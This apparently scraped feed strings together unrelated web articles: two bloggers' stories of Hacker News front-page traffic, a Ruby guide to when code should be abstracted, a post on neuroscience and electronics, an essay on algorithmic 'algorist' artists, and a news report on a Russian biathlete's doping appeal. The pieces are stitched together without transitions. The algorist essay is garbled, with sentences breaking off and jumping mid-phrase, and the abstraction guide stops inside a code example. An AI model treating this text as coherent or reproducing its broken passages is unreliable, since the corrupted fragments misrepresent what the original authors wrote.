			<p>Today I’m going to tell the story of fleeting success. You’ll learn how my article reached the hacker news front page. And how it stayed there for two whole days, changing my perception about what is achievable with my writing hobby.</p>

<p>I started this blog as a new year’s resolution for 2020. One article per week. I didn’t have gigantic aspirations. I wanted to learn how to express myself better because <a href="https://blog.viktomas.com/posts/remote/">remote work</a> is all about written communication. And I wanted to share thoughts about my interests.</p>
<p>First two months I didn’t publish the articles I wrote. I didn’t want to create yet another blog with only a handful posts in it. The writing had to become a habit first.</p>
<p>After I started publishing on this site, I didn’t share it with anybody until late April when I mentioned <a href="https://blog.viktomas.com/posts/plaintext-passwords/">an article</a> on <a href="https://news.ycombinator.com/item?id=22914281">hacker news</a> for the first time. Two people liked it, and about fifty read it according to my analytics.</p>
<p>On Sunday 3rd of May 2020 at 9 AM (CET) I mention my article <a href="https://blog.viktomas.com/posts/losing-google-account/">“What would you do if you lost your Google account?"</a> on <a href="https://news.ycombinator.com/item?id=23057365">hacker news</a>. I was expecting the same results: a couple dozen people read it, a few would like it. But with strike of luck, plenty of people liked the article and of it went to the front page.</p>
<p>By 10 AM, fifteen hundred people visited the site, four times the number of visits since I started the blog. In the following 24 hours, another ten thousand people viewed the blog, and by the time the article left the front page on Monday, <strong>sixteen thousand people</strong> have read it<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. The real number is going to be over thirty thousand because <a href="https://blog.viktomas.com/posts/adblock-skews-analytics/">60% of hacker news readers don’t show in analytics thanks to AdBlock</a>.</p>
<p>I was ecstatic. The whole day I was walking with a wide grin on my face. I immediately googled the WikiHow article on <a href="https://www.wikihow.com/Handle-Fame">How To handle fame</a>. And I took plenty of screenshots because I thought that the article is bound to drop off from the front page after a few minutes and I wanted to have a memory.</p>
<p><img src="https://blog.viktomas.com/images/posts/one-hit-wonder-hn/medium.gif" alt=""></p>
<p>There was a trickle of people coming to see the article ever since. Now about fifty people view the article each week.</p>
<p>The time of my two-day fame has now passed, but I took away valuable lessons.</p>
<p>The first lesson is that I can produce something of value outside of my programming job. I knew I design and write high-quality code and systems and I get well paid for doing that. However, this experience showed me that I could create something else people enjoy.</p>
<p>The second lesson is the type of article people enjoy. The generic articles about <a href="https://blog.viktomas.com/posts/foss/">FOSS</a> and <a href="https://blog.viktomas.com/posts/meditation-introduction/">Meditation</a> are presumably not as interesting as the more down-to-earth articles that contain a few howtos that people can apply straight away. Since the “loosing your google account” article this story repeated itself once more with the <a href="https://blog.viktomas.com/posts/slip-box/">Zettlekasten article</a>. This strengthens my hypothesis that the article needs to provide useful, applicable tool/information to the readers, not just abstract food for thought.</p>
<p>I liked Robert Heaton’s <a href="https://robertheaton.com/2019/09/24/how-to-come-up-with-blog-post-ideas/">Made-Up-Award principle</a>: you should write your article to be the best in some narrow category. Exaggerated example: “best introduction to ruby programming for marketing experts focusing on food marketing”. Another important rule for me is that I have to wish I found that article a few days/weeks before because it would help me solve a problem.</p>
<p>This event gave me just enough extrinsic motivation to help me overcome the initial period when I was considering whether I want to spend eight hours each week writing an article that fifty people read. It helped me to commit to writing as the next of my many hobbies.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last Sunday I published a piece of content for the very first time on hacker news and it ended up getting the #3 spot for a few hours and stayed on the front page for an <a href="https://news.ycombinator.com/front?day=2020-06-28" target="_blank">entire day.</a> The post was about <a href="https://www.sankalpjonna.com/posts/our-aws-bill-is-2-of-revenue-heres-how-we-did-it" target="_blank">how we managed to get our AWS bill to &lt; 2% of our revenue</a>.</p><figure id="w-node-70cd5a19b74c-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015791310d7d85125fef6b_O4P4rEPlKnx7Ng3ZdLmcl81BEdrR4uXkGzmWUwvFM9Ibl9UOF87Zi-4gIjv0F0MdYcbPlL0q_q3RiCywpMppiPUTyLqgVMoR6idh7sVNCR5LiPyWnYgf02BdaG1GBh6C6aenbS3H.png" alt=""></p><figcaption>Hacker News front page</figcaption></figure><p>This was a super thrilling experience for me because I have been a reader of Hacker news for a while but never actually posted anything or even created an account. This is why I had to ask my co-founder <a href="https://twitter.com/hipreetam93" target="_blank">Preetam</a> to post on my behalf as I did not have enough Karma points to even make one post!</p><p>‍</p><p>So I decided to continue this feedback loop of <strong>writing -&gt; being recognized -&gt; writing some more as a result</strong> by talking about what went into writing this post and what were the consequences of being featured on Hacker news.&nbsp;</p><p>‍</p><div><p>There were 3 primary reasons for this post&nbsp;</p></div><ol role="list"><li>Taking the first step at making a series of posts explaining how we solved various problems while building our <a href="https://apps.shopify.com/whatsapp-chat-button" target="_blank">WhatsApp Shopify app</a>. Problems that other indie hackers can relate to and hopefully not reinvent the wheel while solving them. We were hesitant to do this at first because we were afraid of competitors reading these posts and copying our strategies, but we realised recently that what we stand to gain from making a place for ourselves in this community outweighs the risk of competitors giving us trouble.</li></ol><ol start="2" role="list"><li>We plan to build more of such products in the future and It became very clear to us that we have to build our own distribution channels to get users instead of relying on a 3rd party channel like the Shopify App Store which we currently rely on to get 100% of our users. This post was the first attempt to drive some traffic to my personal blog, traffic that we can hopefully use to get the initial customers for our next venture.</li></ol><ol start="3" role="list"><li>An attempt to heal my imposter syndrome which kept holding me back over the years and prevented me from voicing my thoughts in public due to the fear of getting criticised. When I read all the negative comments to my post I realised that negative comments do not necessarily come from a negative place and the people posting such comments are just trying to voice their thoughts based on the unique situations that they deal with on a day to day basis. This means that criticism is very essential for growth</li></ol><p>‍</p><p><strong>Power of Hacker news and Reddit</strong>‍</p><p>‍</p><p>I posted this piece on<a href="http://reddit.com/r/Entrepreneur/" target="_blank"> reddit.com/r/Entrepreneur/</a> and Hacker news and at the time of making the post it did not occur to me that I should track the users that are visiting my blog as a result of these posts even though that was one of the primary intentions behind the post.&nbsp;</p><p>‍</p><p>I finished writing and publishing the post and went offline for a few hours when my co-founder <a href="https://twitter.com/hipreetam93" target="_blank">Preetam</a> texts me saying my post is on the front-page and I should add Google Analytics to my blog ASAP if I have not done it already. I quickly do so and start seeing results immediately&nbsp;</p><figure id="w-node-0de8a57abe57-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015791594ffa6c974ece60_UPCnJKN5cQEljrF22coESNJOE3d7jZwgWNP8xLEkih0T_y5oR0-zYbdVHPN-Lh7ieejS0qmnWW9y2MFDkuo_n71O_zbIs5vZIZ5xAg1IDNaWT0YHP7BPJtgzhIVfwSp3bcWWLjLV.png" alt=""></p><figcaption>Google analytics data</figcaption></figure><p>‍</p><p>As you can see I got ~14k visits on my blog the day I posted it and since I added GA a few hours late, I am assuming I got around 20k or more visits.

The fact that I had access to this kind of traffic and all I had to do was write about something that I myself experienced has given me a new perspective that is backed by actual numbers and graphs. We have all heard people tell us that it is important to write, but this can clearly be backed with actual numbers.&nbsp;</p><p>A few more things happened as a result of this post. I gained some new twitter followers, had engaging conversations with some of them and somebody even suggested that I add an RSS feed to my site so that they can follow my blog easily.&nbsp;</p><figure id="w-node-7aef82240888-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015792e08dc7f5ad78f64b_dzsKkucLoEIlELWuS-2wMH3FsDPvL0abSgho2aEkTvihuHdoD0d7GTGBPtBrn0cEOhOtqs_csRmKdv9VK0GSkacNfALtQr4ByN0nA5S930229eCXsYaZ12_n6ZSAcuGtiHzNkPUY.png" alt=""></p><figcaption>Good folks of twitter helping me out</figcaption></figure><p>For someone who started writing for the first time, seeing so much visible evidence of the benefits of writing has certainly done a lot to fuel my desire to write even more. I am yet to discover what this means in the long run when the post matures enough to start ranking on google search.</p><p><strong>Learnings from people who read the post</strong>‍</p><p>‍</p><p>Here is a TLDR for folks who have not read the post: Use Lightsail, Amazon's approximation of a dedicated server.</p><p>The post highlighted how we managed to save a lot on AWS bills in exchange for sacrificing a bit of resilience and some folks did not take kindly to this fact.</p><figure id="w-node-48d76d4377b1-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015792e830705462abc486_Zrrh_CUjp34hKeGUfsUwkFrV0E-eYtWOr3JnnzrAX-cPIl9K3BtiXxWnH_-m96m42GPnuxNAyfN_ohXlJBW-1K6eWwqNRxWK6oZgzN18fIdE1ouGAb5iKfMrM3LNIK6JjBzu2UdM.png" alt=""></p><figcaption>Harsh comment from a redditor</figcaption></figure><p>When I set up my app on AWS, it did not occur to me that Redundancy was super important. This is because we had the ability to do point in time restores of the Database and launch a new instance in case a disaster ever stuck, but what I failed to consider was the fact that sometimes an entire region in AWS can go dark in which case we won’t have the ability to do a restoration from a backup if that backup is on a region that is down. This is something that I have duly noted and will take into account going forward.</p><p>The above comment though harsh was a useful learning for me which would probably help me in the future but there were also comments that were not going to help anybody at all and my learnings from those comments was to not let them affect you. Find the feedback that will be useful in the long run and ignore the rest. The rest is just noise.</p><p>There were also many positive comments from people who found the post helpful and someone even commented that they moved all their instances to Lightsail after reading my post. There were people who appreciated the fact that I put a disclaimer at the end of my post explicitly saying that this is not a holy grail solution that will work for everyone and it is just something that worked for us.&nbsp;</p><p>Overall the learnings were all net positive and I look forward to sharing more and learning even more from the comments of all my future posts.</p><p><strong>Closing note</strong>‍</p><p>‍</p><p>I would like to conclude by encouraging anyone wanting to share their experiences to write and not be afraid to post it in public because it is totally worth it. You get some validation and you also get criticized but you will certainly find out that even after getting criticized, you are still alive and life goes on.</p></div></div>]]>

<![CDATA[Beginner's Guide to Abstraction]]>

July 4, 2020 | https://jesseduffield.com/beginners-guide-to-abstraction/ | <a href="https://web.archive.org/web/*/https://jesseduffield.com/beginners-guide-to-abstraction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-75">
	<!-- .entry-header -->

	
	
	<div>
		<p>In <em>The Pragmatic Programmer</em>, Andrew Hunt and David Thomas introduced the DRY (Don't Repeat Yourself) principle. The rationale being that if you see the same code copy+pasted 10 times you should probably factor that code into its own method/class.</p>
<p>But then Sandi Metz came along and <a href="https://www.sandimetz.com/blog/2016/1/20/the-wrong-abstraction">said</a>:</p>
<blockquote>
<p>Duplication is far cheaper than the wrong abstraction.</p>
</blockquote>
<p>And so the eternal war began.</p>
<h3>What is abstraction?</h3>
<p>For the purposes of this post I'm referring to the kind of abstraction as described in the <a href="https://en.wikipedia.org/wiki/Abstraction_(computer_science)#Abstraction_in_object_oriented_programming">Abstraction Principle</a>, which Wikipedia describes like so:</p>
<blockquote>
<p>In software engineering and programming language theory, the abstraction principle (or the principle of abstraction) is a basic dictum that aims to reduce duplication of information in a program (usually with emphasis on code duplication) whenever practical by making use of abstractions provided by the programming language or software libraries</p>
</blockquote>
<p>This post has nothing to say about the conceptual kind of abstraction where from the concrete examples of 'Parrot' and 'Sparrow' you create an abstraction of 'Bird'. This post is about duplicated code, how to respond to it, and how to respond to other people's responses to it.</p>
<p>I define the verb 'abstraction' to be an <em>attempt</em> to reduce complexity by combining repeated commonality into some generalisation. And so, the noun 'abstraction' is the result of that attempt. If you're somebody who believes abstraction is by definition a <em>successful</em> attempt, feel free to substitute the term 'wrong abstraction' with 'failure to abstract' throughout this post.</p>
<p>The process of abstraction typically goes like this:<br>
1) you identify different chunks of code that you think are all essentially doing the same thing<br>
2) you create a method or a class with a narrow interface which can be substituted in for all the chunks of code you found<br>
3) you go and swap out the chunks of code with a call to your method/class</p>
<h3>Abstraction is always a gamble</h3>
<p>In the world of software engineering, when requirements are always changing, every abstraction is a gamble. When you make an abstraction over some concrete things, you're making a bet that the concrete things are more similar than they are different, and that their similarities are not mere coincidences: that there is a common purpose shared by the concrete things which would lead them to evolve in lockstep as requirements evolve. If you win the bet, your codebase will be easier to work in and adding new use cases via your abstraction will be trivially easy. If you lose, you'll see a flash of fear in your colleague's eyes whenever they're assigned a ticket to make yet another extension to the misfigured monster that the once-innocent abstraction has now become</p>
<p>But risk abounds everywhere, and leaving duplicated code unabstracted is its own gamble. You're betting that the chunks of code will evolve in separate directions as requirements change and that their current similarities are more coincidence than a reflection of their common purpose. Win the bet and your colleague gets to sleep soundly at night knowing they won't be facing the abstraction monster at work the next day. Lose, and code that should have evolved in lockstep is now implemented in completely different ways across different files, where a developer fixes a bug identified in one place, only for the same bug to be reported days later in a completely different file.</p>
<p>Your job is to get good at making the right bets.</p>
<h3>The right/wrong abstraction</h3>
<p>You'll know that you've made the <em>right</em> abstraction when a long time passes and you haven't needed to expand the interface (an example of expanding the interface is adding an optional flag argument). You'll also know you've made the right abstraction when another developer doesn't find it that much harder to understand how the code behaves for a given use case than if somebody had written the code to satisfy the use case without the abstraction.</p>
<p>You'll know you've made the <em>wrong</em> abstraction when after a while the interface has been expanded to support various optional flags, each for a different use case, and you need to be a genius to reason about what the code will actually do for a given use case. By the way, if you have a string arg that merely gets fed into a switch statement inside a method and for each new use case you come up with a new accepted value for it, you <em>are</em> expanding the implicit interface, even if that fact isn't captured in your type system.</p>
<p>There is plenty of daylight between the perfect abstraction and the completely wrong abstraction (perhaps the interface needs to be fundamentally changed but afterwards you're back to having a good abstraction), and so the point of this section isn't to prescribe how much you should be abstracting, but to encourage you to think about both perspectives and be able to make a case in a PR review for why you think an abstraction should/should-not exist.</p>
<h3>Do you over or under-abstract?</h3>
<p>Given it is impossible to make the right decision with regards to abstraction every time, you are probably either somebody who over-abstracts or somebody who under-abstracts.</p>
<p>If common feedback on your PR reviews is that you should DRY up your code, you could probably benefit from doing a scan for duplicated code before submitting a PR and considering whether it belongs in its own method/class.</p>
<p>If you commonly get feedback that your methods are hard to understand because they support too many disparate use cases at once, you are probaby over-abstracting and should consider whether you should increase your tolerance for duplication.</p>
<p>Note that it's not always as simple as under-abstracting vs over-abstracting. Sometimes abstraction is appropriate, but you might take the wrong approach. If an abstraction is deemed wrong by the team, that doesn't mean no abstraction is necessarily the best alternative.</p>
<h3>Under-abstraction examples</h3>
<p>The main sign that you could be under-abstracting is that you have a heap of code doing the exact same thing called in a heap of places with no obvious reason why anybody would want the code to diverge.</p>
<h4>Example: Hard-coded formulas</h4>
<h5>Bad:</h5>
<pre><code># sphere has radius of 11
sphere_volume = 4*Math::PI/3*11**3
puts "the volume of the sphere is #{sphere_volume} cm^3"
...

radius = calculate_radius
volume = 4*Math::PI/3*radius**3
sphere.volume = volume</code></pre>
<h5>Good:</h5>
<pre><code>def sphere_volume(radius)
  4*Math::PI/3*radius**3
end

# sphere has radius of 11
sphere_volume = sphere_volume(11)
puts "the volume of the sphere is #{sphere_volume} cm^3"
...

radius = calculate_radius
volume = sphere_volume(radius)
sphere.volume = volume</code></pre>
<p>Why is it a good idea to abstract the formula for a sphere's volume into its own method? Because if mathematicians ever found out they got the formula wrong, you would want to go through all the places in your code that you used the formula and update it to be correct. That is, we know ahead of time that we want the code to be in lockstep. This is as safe a gamble as you can get.</p>
<h3>Over-abstraction examples</h3>
<p>The main sign that you're over-abstracting is that your method accepts a bunch of optional args:</p>
<h4>Example: Bloated method</h4>
<h5>Bad:</h5>
<pre><code>def average(arr, type = Integer, ignore_nulls = false)
  if arr.any?(&amp;:nil?)
    if ignore_nulls
      arr = arr.compact
    else
      return nil
    end
  end

  if type == String
    arr = arr.map(&amp;:to_i)
  end

  arr.sum / arr.size
end

puts average([1,2,3])
=&gt; 2

puts average(['1','2','3'], String)
=&gt; 2

puts average(['1','2','3', nil], String, true)
=&gt; 2

puts average([1, 2, 3, nil], Integer, false)
=&gt; nil</code></pre>
<p>If you want to know how the <code>average</code> method behaves when you're dealing with an array of strings with no <code>nil</code> values, you have to read through the first if condition which has nothing to do with your use case before reaching the code that does. Likewise if you want to know how the <code>average</code> method behaves when the array contains either nils or integers, the second if condition is irrelevant, but you'll still need to read through that to understand how the whole thing works.</p>
<p>If each of the use cases came up dozens or hundreds of times, maybe then it would make sense to retain the abstraction, but when the number of optional arguments is roughly equal to the number of different use cases, chances are you've got the wrong abstraction.</p>
<h5>Good:</h5>
<pre><code>def average(arr)
  arr.sum / arr.size
end

puts average([1,2,3])
=&gt; 2

arr = ['1','2','3'].map(&amp;:to_i)
puts average(arr)
=&gt; 2

arr = ['1','2','3', nil].compact.map(&amp;:to_i)
puts average(arr)
=&gt; 2

arr = [1, 2, 3, nil]
if arr.any?(&amp;:nil?)
  puts nil
else
  puts average(arr)
end
=&gt; nil</code></pre>
<p>In this case we're not removing the abstraction altogether: we're just keeping the part that actually applies to all cases. Now understanding the logic of any one invocation of our <code>average</code> method is trivial.</p>
<p>We now have <code>.map(&amp;:to_i)</code> being duplicated whereas it only appeared once in the <code>Bad</code> alternative, but it's a small cost for a vast improvement.</p>
<p>Note that looking at the <code>Good</code> variant, it's clear that the behaviour is quite different from one use case to the next, but that is not at all clear in the <code>Bad</code> variant because the method calls all look so simple and it was anybody's guess how much code inside <code>average</code> applied to each use case.</p>
<p>This is why abstractions go bad over time: because as you expand the interface more and more, it becomes harder and harder to judge how appropriate the abstraction is to any given use case, and developers end up assuming that all that convoluted code is vaguely relevant to the majority of use cases when in fact it's not.</p>
<h4>Example: Awkward class</h4>
<h5>Bad:</h5>
<pre><code>class Shape
  def initialize(radius: nil, width: nil, type:)
    @radius = radius
    @width = width
    @type = type
  end

			<p><span>I’m interested in the the way the brain works. </span></p>
<p><span>I have been from as far back as I remember. I naturally gravitated towards the </span><span><a href="https://en.wikipedia.org/wiki/Neuroscience">neuroscience</a></span><span> section without realizing what it was or why I was found myself there. I suspect it’s the combination of the study of the brain’s mysterious inner workings combined with a scientific methodology. I’ve casually dipped into Psychology and Behavior but it didn’t have the logic and neat explanations that I was used to in the sciences. I originally studied Electronic Engineering years ago, then coding and the design of technical solutions. I never considered how my knowledge of electronics could map to neuroscience but it turned out it does, quite nicely. In Electronics you learn the fundamentals of building small devices like current, resistance, voltage, and capacitance. This knowledge allows you to invent new machines or software. In Neuroscience you have those same principles but current is the flow of ions, voltage is in micro sizes and capacitance and resistance depend of the biology of our bodies. It’s the study of the ultimate machine – the human.</span></p>
<h4>The Human Body is the Best of Machines</h4>
<p><span>I signed up to the </span><span><a href="https://courses.edx.org/courses/course-v1:HarvardX+MCB80.1x+2T2020/course/">Harvard EdX – Fundamentals of Neuroscience Part 1</a></span><span> course. It’s free course but you can pay a small fee at the end for the certificate.</span><span><span>&nbsp; </span></span><span>The mathematical formulas got my brain grinding again, I felt a pang of nostalgia as I started plugging numbers into equations. In neuroscience you have to worry about a lot more than the physical mechanics. You’re dealing with liquid solutions that contain ions like Sodium or Potassium that surround the machinery and the complex arrangement of cells and their membranes. I noticed there was a shift from absolutes to probabilities. You can only be a percentage level sure that an action by a neuron would happen. In electronics we usually know for certain if all other parameters are constant. In the study of neuroscience I felt like I was discovering the blueprint of an impossibly complicated design of a machine. In electronics, I was learning about small building blocks that I could use to design new machines. It was humbling. </span></p>
<p><span>I would recommend the course if you have a physics or electronics background. For one, you’ll find it easy to understand the concepts. Two, you’ll be in awe of the way the human body works. And three, you will have a new understanding and appreciation of occasions where the body fails to work as intended e.g. </span><span><a href="https://www.nationalmssociety.org/What-is-MS">Multiple Sclerosis</a></span><span> which occurs when certain elements are damaged leading to the debilitating symptoms in the nerves.</span></p>
<h4>The Advances of Electronics + Neuroscience</h4>
<p><span>The intersection of electronics and neuroscience is not new but over recent years, advances in both fields have opened the door to some intriguing research. For example I came across </span><span><a href="https://www.tandfonline.com/doi/full/10.1080/23746149.2019.1664319">this research from last year on flexible electronics that can enable new types of neural implants to restore function in the human body</a></span><span>. Another </span><span><a href="https://theconversation.com/to-understand-the-brain-you-need-electronic-engineers-too-26104">article, although several years old now, puts forward the case for more electronic engineers in the field of neuroscience</a></span><span> to help make new discoveries in brain disorders and artificial intelligence. In particular, the idea of mimicking the design of real neuron behavior and applying that to the electronic circuits that power our devices. I recently read a book about patterns in nature that are remarkably similar throughout disciplines </span><span><a href="https://recknsense.com/natures-deep-design-of-the-mind/">‘A Beautiful Question: Finding Nature’s Deep Design’ by Frank Wilczek</a></span><span>. In the book, the author points out that many discoveries shared striking patterns of symmetry and balance. It stands to reason that the patterns we can identify in a human intelligent machine could lead us to design better machines – even if we don’t understand exactly how they work. Unlike our digital functioning machines, the patterns in neuroscience are analogue and less predictable. With our deeper understanding of quantum mechanics we are finding out that at a tiny, quantum level, the patterns are also less based on digital 1’s and 0’s. Somewhere, these two disciples should inevitably meet with the net effect of improving both.</span></p>
<p><span>Recently there has been some very exciting research that shows signs of doing that, specifically to improve the design of electronic devices. </span><span><a href="https://www.sciencedaily.com/releases/2020/04/200420084249.htm">The University of Massachusetts Amherst published a paper in April 2020 that explains the discovery of miniature tools (memristors) that operate like real brain synapses</a></span><span>. In this way the electronics mimic the human brain in efficient learning by being able to operate at very small voltage levels, much like the brain itself. This low power efficiency can open the doors for many possibilities including the notion that one day we could invent devices that ‘speak to’ real human neurons.</span></p>
<h4>The Future is Neuromorphic</h4>
<p><span>The study of mimicking brain neurons is called ‘</span><span><a href="https://en.wikipedia.org/wiki/Neuromorphic_engineering">Neuromorphic engineering</a></span><span>’ and is a pioneering field. You can read more about it here and find out why it is likely to trigger a revolution in engineering. This informative article goes into more detail on the analog nature of Neuromorphic engineering and the world changing applications that could be developed as a result. It also goes into a lot more detail on the technology.</span></p>
<p><span>The fundamentals of neuroscience course I took gave me a great introduction to a new field of study. But it also gave me an opportunity to refresh on some old knowledge while learning something new and to consider what this new combination of technologies could offer for the future. The real excitement though is the idea of taking the examples we discover within ourselves and using this as a guide to develop groundbreaking new technologies that could change everything. </span></p>

	<p>Often I am asked "Who are the algorists?<span size="3">"
		</span><span face="Times New Roman">&nbsp;</span>Simply put a<span size="3">n

		that include their own algorithms.&nbsp;&nbsp;</span><span face="Times New Roman">This 
	page presents an account of the adaptation of this term by a group 
	of artists in 1995.&nbsp; Algorithmic art has a deep history that reaches 
	back to prehistoric art. But the advent of computing power spawned an 
	artistic practice with form-generating features that is relatively unique to 
	the last quarter of the 20th Century. Computer power gives the artist's 
	algorithms a leverage we might liken to the power of the engine in the 
	industrial revolution.&nbsp; In 1969, when I first tasted algorithmic 
	leverage, I set out to learn how to use it as an artist. </span></p>

	<p>I met other artists following the same path who were interested in an 
	identity for their algorithmic art practice. It was Jean Pierre Hebert (JPH) who suggested we adopt 
	the term "algorist" and he also wrote the algorithm for an <i>algorist.&nbsp; </i>This algorithm is now viewed as the "<i>algorist manifesto</i>"<i> </i>
	and it was JPH who led discussions and correspondence in establishing its 
	usage. <i>&nbsp;</i>While the practice of algorithmic art reaches back to 
	pre-historic basket-weaving and tool-making the implementation with 
	computing power provided new "form-generating" capabilities.</p>
	<p>Although adapted in 1995 the term applies to work by colleagues that date 
	back to the 1960's and even earlier. <span face="Times New Roman">
	<span>&nbsp;With the rise of ubiquitous

	consciousness.</span> </span> </p>
	<p><span face="Times New Roman" size="4">The term "<i>algorithm</i>"</span></p>
		<p><span size="3">The term <i>algorithm</i> is an 
		alternative spelling for the term "<i>algorism</i>". Thus a person who 
		works with&nbsp; algorisms (or algorithms) is an <i>algorist</i>.&nbsp; 
		Traditionally the term algorist is associated with mathematicians. An algorithm refers 
		primarily to the step by step mathematical procedure for 
		carrying out a specific calculating task (see </span><i>

		drawing machine on how to draw a visual form is also an algorithm.<span size="3">&nbsp;
		</span>Today, more broadly, a composer's score for musical form and a 
		choreographer's notations for dance may also be viewed as algorithms. 
		Such notations, similar to computer software formats, are detailed 
		procedures for carrying out a task.&nbsp;From this perspective we could 
		also view the recipe for baking a cake as an algorithm.</p>

		<p><span>Algorithmic art may be found throughout history, from prehistoric 
		basket weaving to geometric and conceptual art in the 20th Century. 
		However,&nbsp; the advent of computers provide us with form-generating 
		leverage that, to the best of my knowledge, has no precedent in&nbsp; 
		the history of art. It is in&nbsp; this sense that algorist artists of 
		the late 20th Century pioneered procedures that have come to permeate 
		the visual and sound arts in&nbsp; the 21st Century.</span></p>
	<div>
		
		<p><span size="3"><span>In the latter 
		half of the 20th Century, with the growth in information science and 
		digital technologies the use of&nbsp; algorithmic procedure spread far 
		beyond the dreams of its earliest practitioners. We&nbsp; have, among 
		the living in 2012, a number of&nbsp; algorists whose vision and work with programming&nbsp; pointed 
		the way that permeates the world of&nbsp; art today.&nbsp;</span>Pictured above,<i> 
		in a single frame,&nbsp; </i>are four algorists who were present in the context of a display of&nbsp; 
		digital pioneer works at the Victoria &amp; Albert in London, 2010.&nbsp;A 
		retrospective of&nbsp; the pioneer work of Hiroshi&nbsp; Kawano, 
		pictured above, was presented at the ZKM in Karlsruhe, Germany, in 
		2011-12 before he died.&nbsp;&nbsp; </span>While not present for the photo above, celebrated pioneers like

		<p><span size="4">Historic Notes: Writing the score for drawing.</span></p>
		<p>In the last quarter of the 20th Century I was one of a 
		like minded group of artists who undertook to write instructions for 
		executing our art.&nbsp; In the 1970's &amp; 80's&nbsp; "Computer art" was the term 
		generally applied to all art associated with computers.&nbsp; Some of us had been working with 
		algorithmic procedure for about a quarter century before our 1995 
		declaration as "algorists".&nbsp; The 1995 manifesto of the "algorists" 
		was not a declaration of something new; rather, it was giving identity 
		to an artistic practice that had already brought radical change and 
		would continue to change the way we would create art in&nbsp; the 21st 
		Century.&nbsp;The algorist adaptation provided a name for artists who 
		practiced algorithmic art.&nbsp; This practice also had a valuable presence in sculpture 
		and music. Helaman Ferguson would be a sculptor whose algorithmic art&nbsp; 
		celebrated an aesthetic rooted in mathematics.&nbsp; His "Four Canoes", 
		shown below, is an excellent example with links to information on the 
		procedure for achieving the form of the tori, the pedestal, and the 
		platform. </p>

		<p>Yet algorithmic art should not be confused with the practice of 
		mathematics. The process of writing the score for a drawing requires 
		poetic engagement similar to that required for composing the score for 
		music.&nbsp; 
		Algorithmic drawings, like my "Green Cloud" shown below, evolved from my 
		passion, as a painter, for the marriage of spontaneous brushwork and 
		studied arrangement.&nbsp; With elementary programming abilities I 
		explored the same goals I had set for myself as a painter.&nbsp; Clearly 
		programming and mathematics do not create art.&nbsp; Programming is a 
		tool that serves the vision and passion of the artist who creates 
		the procedure.</p>

	<p>LOOKING BACK</p><p>Before looking back&nbsp; let me note

	how did we get here?</i></span><span face="Times New Roman">
	</span>
	</p><p><span size="3">In the earlier days of computing there were 
	no software tools for artists. Frieder Nake told me how he came upon the 
	task of writing software for a drawing machine at the University of 
	Stuttgart in 1963.&nbsp; The company did not supply software with the 
	machine and he was assigned the task.&nbsp; During the&nbsp; 1960's&nbsp; 
	several artists like 
	Manfred Mohr and Hiroshi Kawano saw the "form-generating" power of computers 
	as an opportunity for art.&nbsp;Hiroshi Kawano had hoped to gain insight 
	into the logic underlying our creative process.&nbsp; Software and technical procedures for visualization

<p>Even today, more than five years after the end of her career, Olga Zaitseva says she doesn’t drink from water bottles if they have already been opened. Even when she visits friends, she says she always has a new one brought to her. "It’s an old habit,” she admits, before laughing softly.</p>

<p>Zaitseva, 42, has retained the quirk from her past life. The Russian with blonde curls and narrow eyes was once one of the world’s best biathletes, an Olympic champion. Her success put her in the near-constant sights of doping-control officers.</p><p>She took special precautions to make sure that she never consumed anything that was prohibited. "As an athlete, I was responsible for what went into my body, which is why I always carried my own water bottles with me,” she says. "That way I could make sure that no one slipped anything into it.” When Zaitseva ended her career in January 2015, after hundreds of competitions and countless doping tests, she was considered a clean athlete.</p>

<p><strong>Banned for Life</strong></p><p>In the coming days, three judges at the Court of Arbitration for Sport (CAS) in Lausanne, Switzerland, will determine whether that claim still holds true. In 2017, the International Olympic Committee (IOC) banned the Russian athlete for life over violations of anti-doping regulations. The IOC claimed Zaitseva had profited from a system of fraud that concealed massive Russian doping at the 2014 Winter Olympics in Sochi at the behest of the government.</p><p>Zaitseva says she has "never, ever, ever, ever, ever” doped in her life, "and if I have to, I will gladly repeat that a million times.” Zaitseva appealed the decision together with two other female athletes who were also banned by the IOC.</p>

<p>On the surface, the proceedings seem like just another chapter in the endless Russian doping scandal that has gripped the sporting world for more than five years now. But the credibility of the most important key witness to the mass fraud is on the line, and if the court sides with the Russian athletes, it could trigger a domino effect, given that other cases are still pending. The three biathletes also filed a $30-million (27-million-euro) lawsuit in New York against Russia’s former anti-doping laboratory director, who lives in hiding in the United States. In their suit, they claim they are the victims of defamation and that their names, victories and honors have been vilified for no reason.</p>

<p>Several pieces of evidence in the files from the Swiss proceedings that DER SPIEGEL has viewed in recent weeks seem not only to substantiate Zaitseva’s claims of innocence, they also appear to raise questions about the overall credibility of the investigation into the Sochi conspiracy and whether too much faith was placed in the account provided by the whistleblower in the scandal.</p><p><strong>An Old Conflict Flares Up Again</strong></p><p>The case has long been a political issue. In recent years, forensic scientists and special investigators have been poring over urine samples and scientific evaluations in hopes of a resolution, and parliaments and heads of state have either condemned or categorically denied Russia’s systemic fraud. It has rekindled a conflict between East and West and between hopelessly overburdened sporting associations.</p><p>What is certain is that many Russian athletes have been cheating the system. Russia’s track and field federation has been suspended from international competitions since 2015. In 2019, the World Anti-Doping Agency (WADA), recommended the Russian flag and national anthem be banned from the Olympic Games and other major events for four years in response to the tricks used by Moscow in its efforts to hinder the investigation into the doping scandal.</p>
</div>

<div>
